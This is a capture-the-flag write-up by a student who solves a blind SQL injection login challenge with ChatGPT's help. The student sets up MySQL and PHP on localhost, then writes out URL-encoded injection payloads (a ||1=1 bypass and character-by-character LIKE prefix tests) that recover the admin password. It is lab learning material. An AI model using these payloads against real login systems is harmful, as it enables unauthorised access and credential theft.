CHALLENGE DESCRIPTION:
“In the Dark: Blind SQL Injection”

A login system has been deployed in a hurry.
It gives almost no errors, no warnings, and no visible database output.

Everything looks normal.
Too normal.

But behind the scenes, the database is listening.

Your mission:
Extract the admin password without ever seeing the database response directly.

You will not be shown the data.
You must infer it.

Welcome to the dark side of SQL Injection.

Hint: The system only answers one thing:
Success or Failure

Can you ask the right questions????

ANALYSIS/APPROACH: 
As i didn't know anything about SQLi, I took the assistance of Chatgpt for this task. First i had to install a lot of things to get this task done. like mysql-server, php, php-mysql, curl. So the goal was to make the website tell me yes or no responses to rebuilds the password. then i saw that the page accepts sample.php?pw=... so the injection point was "pw".
first i created the challenge database,
So ran MySQL, put this query in it

CREATE DATABASE sqli_challenge;
USE sqli_challenge;

users table
CREATE TABLE users (
    id VARCHAR(20),
    pw VARCHAR(50)
);

the database was empty so insert users,
INSERT INTO users VALUES ('guest', 'guest');
INSERT INTO users VALUES ('admin', 'SUPERSECRET');

create MySQL user for PHP
CREATE USER 'teni'@'localhost' IDENTIFIED BY 'teni';
GRANT ALL PRIVILEGES ON sqli_challenge.* TO 'teni'@'localhost';
FLUSH PRIVILEGES;

EXIT;

- made a new directory and copied the sample.php file into it. Then started the php server.
php -S 127.0.0.1:8000
- then open a new terminal and opened the challenge page in a browser. http://127.0.0.1:8000/sample.php
- then I checked if the injection exist by adding "%27||1=1%23" to the end of this website. http://127.0.0.1:8000/sample.php?pw=%27||1=1%23
- this showed the login as guest http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23
- this would login as admin. so now i know that injection works.
- now check if the password character starts with a letter using like.
- tried 'a'--> http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20like%20%27a%25%27%23
- showed the user as guest
- then tried with different variables.
- then got the first letter as S. http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27S%25%27%23
- now try the second letter.
- got the letter U. http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20like%20%27SU%25%27%23
- continue for the full password: SUPERSECRET. http://127.0.0.1:8000/sample.php?pw=supersecret
- then this will appear. CHALLENGE CLEARED!! Hello admin !!

Flag: flag{supersecret}
